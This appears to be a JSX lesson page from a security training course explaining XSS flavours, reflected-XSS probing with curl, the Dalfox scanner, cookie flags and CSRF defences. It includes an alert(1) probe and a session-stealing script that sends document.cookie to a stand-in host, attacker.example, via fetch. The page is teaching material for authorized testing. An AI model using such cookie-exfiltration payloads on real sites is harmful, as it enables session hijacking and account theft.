import CodeBlock from '../../components/lesson/CodeBlock';
import Callout from '../../components/lesson/Callout';

export default function XssSessionAttacks() {
  return (
    <div className="prose-hh">
      <h1>XSS &amp; Session Attacks</h1>
      <p>
        Cross-Site Scripting (XSS) happens when user-controlled input is rendered back into a page without
        proper encoding, letting an attacker's HTML/JavaScript execute in another user's browser. It's the
        client-side counterpart to injection — same root cause (untrusted input treated as code), different
        execution context.
      </p>

      <h2>The three flavors</h2>
      <ul>
        <li><strong>Reflected XSS</strong> — the payload comes from the request (e.g. a search query
        parameter) and is immediately reflected back in the response. Requires tricking a victim into
        clicking a crafted link.</li>
        <li><strong>Stored XSS</strong> — the payload is saved server-side (a comment, a profile field)
        and served to every user who views that content later. Higher impact — no click-through needed.</li>
        <li><strong>DOM-based XSS</strong> — the vulnerability lives entirely in client-side JavaScript
        that unsafely writes attacker-controlled data (e.g. from <code>location.hash</code>) into the DOM,
        never touching the server at all.</li>
      </ul>

      <h2>Detecting reflected XSS</h2>
      <CodeBlock label="the core test">{`# baseline
curl "http://10.10.60.5/search?q=test"

# probe — does the app encode this, or reflect it verbatim?
curl "http://10.10.60.5/search?q=<script>alert(1)</script>"

# vulnerable response contains the tag UNENCODED:
#   <p>Results for: <script>alert(1)</script></p>
# safe response HTML-encodes it:
#   <p>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</p>`}</CodeBlock>
      <p>
        This is the exact test you'll run in this module's lab — inspecting whether the raw payload comes
        back verbatim (vulnerable) or encoded (safe), which is precisely how a real tester confirms XSS
        before ever needing a browser.
      </p>

      <h2>What a real payload accomplishes</h2>
      <CodeBlock label="beyond alert(1) — a session-stealing payload">{`<script>
fetch('https://attacker.example/steal?c=' + document.cookie)
</script>`}</CodeBlock>
      <p>
        <code>alert(1)</code> only proves execution. In a real (authorized) test, the report-worthy impact
        is what you demonstrate <em>can</em> happen — exfiltrating session cookies, performing actions as
        the victim, or defacing content — always with client authorization for anything beyond a harmless
        proof-of-concept.
      </p>

      <h2>Automating discovery: Dalfox</h2>
      <p>
        Manually crafting a payload for one parameter at a time doesn't scale to a target with hundreds of
        parameters across dozens of pages. <strong>Dalfox</strong> is a dedicated XSS scanning tool built to
        close that gap — it automates parameter discovery, fires a large library of context-aware payloads
        at each one, and then verifies execution (rather than just guessing from a reflected string) using a
        headless browser.
      </p>
      <CodeBlock label="scanning a single URL with Dalfox">{`dalfox url https://target.com/search?q=FUZZ
# discovers reflected parameters, tries encoding/context-aware payload variants for each,
# and reports only the ones it actually confirmed execute — cutting down false positives`}</CodeBlock>
      <p>
        The same instinct from the detection test above — does the payload come back encoded or raw — is
        exactly what Dalfox automates at scale, plus the extra step of confirming real execution so you're
        not chasing false positives across a large target.
      </p>

      <h2>Session attacks: cookies and tokens</h2>
      <CodeBlock label="what to check on every session cookie">{`Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly    -> JavaScript cannot read this cookie (mitigates XSS cookie theft)
Secure      -> only sent over HTTPS
SameSite    -> controls whether it's sent on cross-site requests (mitigates CSRF)`}</CodeBlock>
      <p>
        A session cookie missing <code>HttpOnly</code> is what makes the fetch-based theft payload above
        actually work — always check for its presence when testing session handling.
      </p>

      <h2>CSRF: the session's other classic attack</h2>
      <p>
        Cross-Site Request Forgery tricks a logged-in victim's browser into submitting a request they never
        intended — e.g. a hidden auto-submitting form on an attacker's page that changes the victim's email
        address, riding on their already-authenticated session cookie. The standard defense is a CSRF token
        — a random value the server requires on state-changing requests that an attacker's page cannot
        predict or read cross-origin.
      </p>

      <Callout variant="tip">
        <p>
          Quick mental test for CSRF exposure: does this state-changing endpoint rely on the cookie alone
          for authentication, with no additional unpredictable token? If yes, it's a CSRF candidate worth
          testing further.
        </p>
      </Callout>

      <Callout variant="danger">
        <p>
          Never run a real cookie-exfiltration payload against a target outside an authorized engagement —
          even a "proof of concept" alert box against a live third-party site without permission can be a
          computer misuse offense.
        </p>
      </Callout>
    </div>
  );
}
